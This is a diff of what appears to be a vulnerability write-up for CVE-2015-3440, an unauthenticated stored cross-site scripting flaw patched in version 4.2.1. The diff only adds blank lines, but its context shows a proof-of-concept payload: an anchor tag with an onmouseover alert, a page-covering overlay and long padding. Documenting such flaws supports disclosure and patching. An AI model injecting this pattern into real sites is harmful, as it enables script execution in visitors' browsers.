@@ -10,10 +10,14 @@
 	<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 
 
+
+
 # The types / classes of vulnerabilities involved and any related CVE identifiers
 #### Unauthenticated Stored Cross-Site Scripting (XSS)
 
 #### CVE-2015-3440 
+
+
 
 # Affected versions and patches
 #### Affected version
@@ -21,5 +25,7 @@
 
 #### Patched in
 ###### version 4.2.1
+
+
 
 # Demo
